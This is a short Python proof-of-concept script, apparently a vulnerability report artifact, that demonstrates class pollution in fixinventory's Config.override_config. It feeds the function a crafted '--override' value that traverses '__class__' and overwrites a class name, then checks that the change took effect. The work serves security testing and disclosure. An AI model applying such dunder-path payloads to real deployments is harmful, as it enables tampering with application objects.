# CLASS POLLUTION PROOF OF CONCEPT (PoC) - Local Trigger
# Class Pollution Func: Config.override_config (via CLI --override flag)
# Type: get-both-set-both
# Trigger: fixinventory --override "__class__.__name__=pwnd"

from fixlib.config import Config

class Target: pass
target = Target()

payload_value = "pwnd"

def run_poc():
  # Simulates CLI: fixinventory --override "__class__.__name__=pwnd"
  cfg = Config("test")
  cfg.data = {"target": target}
  # override_config splits on "=" then ".", traverses with getattr/[], sets with setattr/[]
  Config.override_config(cfg.data, ["target.__class__.__name__=" + payload_value])

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified! (local CLI trigger)")

if __name__ == "__main__":
  verify_poc()
